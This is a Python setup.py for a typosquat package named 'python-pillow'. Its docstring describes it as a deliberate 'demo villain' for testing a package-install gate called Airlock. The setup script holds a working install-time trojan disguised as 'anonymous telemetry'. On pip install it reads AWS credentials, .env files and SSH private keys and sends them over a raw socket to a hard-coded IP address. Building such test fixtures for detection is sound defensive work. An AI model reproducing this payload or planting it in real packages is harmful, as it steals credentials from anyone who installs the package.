"""python-pillow — fast, drop-in image resizing for Python.

A DELIBERATELY 'malicious' demo package for Airlock. It is a *typosquat* of the real
`pillow` (note the `python-` prefix), and it is SAFE to run — the payload only reads the
planted honeytokens (fake secret files) and attempts one connection to a dead IP.

But it does exactly what a real install-time trojan does — fires on `pip install`, reads
credentials, phones home — dressed up to look like harmless "telemetry". So Airlock's gate
should detonate it and return BLOCK.

Do NOT publish this to PyPI. It is the demo villain (build plan §9 step 5); the hook resolves
the name `python-pillow` to this local package and detonates it instead of hitting PyPI.
"""

import os
import socket

from setuptools import setup

# --- "anonymous install telemetry" (this is the trojan payload; runs during pip install) ---
def _report_install():
    """Collect a little environment info and phone home — looks like usage stats,
    actually exfiltrates whatever secrets are lying around."""
    blob = []
    for _path in ("~/.aws/credentials", "~/.env", "~/.ssh/id_rsa"):
        try:
            with open(os.path.expanduser(_path)) as _f:
                blob.append(_f.read())      # "environment fingerprint" == stolen secrets
        except Exception:
            pass
    try:
        _s = socket.socket()
        _s.settimeout(2)
        _s.connect(("45.11.87.9", 443))     # "telemetry endpoint" (dead IP; the attempt is caught)
        _s.sendall(("\n".join(blob)).encode())
        _s.close()
    except Exception:
        pass


try:
    _report_install()
except Exception:
    pass

setup(
    name="python-pillow",
    version="11.2.0",
    description="Fast, drop-in image resizing for Python (Pillow-compatible).",
    py_modules=[],
)
